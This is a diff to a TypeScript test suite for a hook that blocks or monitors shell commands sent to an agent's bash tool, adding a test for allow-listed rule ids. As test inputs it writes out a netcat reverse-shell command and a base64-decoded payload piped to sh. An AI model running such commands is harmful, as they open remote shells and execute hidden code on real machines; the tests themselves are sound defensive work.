@@ -69,14 +69,20 @@ describe("command evaluation", () => {
 
 describe("commands feed hook", () => {
   const fetchZip: any = async () => new Response(ZIP, { status: 200 });
-  async function harness(mode: "enforce" | "monitor" | "off", installed = true) {
+  async function harness(mode: "enforce" | "monitor" | "off", installed = true, allow: string[] = []) {
     const store = new FeedStore(tmp(), fetchZip);
     if (installed) { store.optIn(); const ev = await store.update("commands"); if (ev.type !== "feed_update") throw new Error(JSON.stringify(ev)); }
     const handlers: Record<string, any> = {}; const pi: any = { on: (n: string, h: any) => { handlers[n] = h; } };
     const logged: any[] = []; const notes: string[] = [];
-    setupCommandsFeed(pi, { feeds: { commands: mode } } as any, { log: (e: any) => logged.push(e) } as any, store);
+    setupCommandsFeed(pi, { feeds: { commands: mode, allow } } as any, { log: (e: any) => logged.push(e) } as any, store);
     return { fire: (command: string) => handlers.tool_call?.({ toolName: "bash", input: { command } }, { hasUI: true, ui: { notify: (m: string) => notes.push(m) } }), registered: !!handlers.tool_call, logged, notes, store };
   }
+  test("feeds.allow: an accepted rule id is neither recorded nor shown, other rules still fire (G4)", async () => {
+    const h = await harness("enforce", true, ["7f734ed0-4f47-46c0-837f-6ee62505abd9"]); // the netcat rule
+    expect(await h.fire("nc -e /bin/sh 10.0.0.1 4444")).toBeUndefined();
+    expect(h.logged).toHaveLength(0); expect(h.notes).toHaveLength(0); expect(stats.feeds.commands).toBe(0);
+    expect(await h.fire("echo aGk= | base64 -d | sh")).toMatchObject({ block: true });
+  });
   beforeEach(() => { stats.feeds.commands = 0; stats.blocked.feed = 0; });
   test("store round-trips a binary feed; monitor records + shows; enforce blocks; off/absent inactive", async () => {
     const h = await harness("monitor");
